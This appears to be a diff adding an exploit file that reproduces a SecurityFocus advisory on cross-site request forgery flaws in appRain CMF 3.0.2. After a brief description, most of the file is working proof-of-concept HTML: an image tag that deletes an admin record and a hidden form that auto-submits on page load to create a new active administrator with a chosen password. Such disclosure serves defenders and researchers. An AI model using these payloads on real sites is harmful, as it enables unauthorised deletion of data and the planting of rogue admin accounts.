@@ -1,0 +1,24 @@
+source: http://www.securityfocus.com/bid/62061/info
+
+appRain CMF is prone to multiple cross-site request-forgery vulnerabilities.
+
+Exploiting these issues may allow a remote attacker to perform certain unauthorized actions in the context of the affected application. Other attacks are also possible.
+
+appRain CMF 3.0.2 is vulnerable; other versions may also be affected. 
+
+<img src="http://www.example.com//appRain-v-3.0.2/common/delete_row/Admin/[ID]" width="1" height="1">
+
+<html>
+<body onload="submitForm()">
+<form name="myForm" id="myForm"
+                action="http://www.example.com/appRain-v-3.0.2/admin/manage/add" method="post">
+                <input type="hidden" name="data[Admin][f_name]" value="abc">
+                <input type="hidden" name="data[Admin][l_name]" value="defghi">
+                <input type="hidden" name="data[Admin][email]" value="y.xvz@gmail.com">
+                <input type="hidden" name="data[Admin][username]" value="abc">
+                <input type="hidden" name="data[Admin][password]" value="abc123">
+                <input type="hidden" name="data[Admin][status]" value="Active">
+                <input type="hidden" name="data[Admin][description]" value="">
+</form>
+<script type='text/javascript'>document.myForm.submit();</script>
+</html>
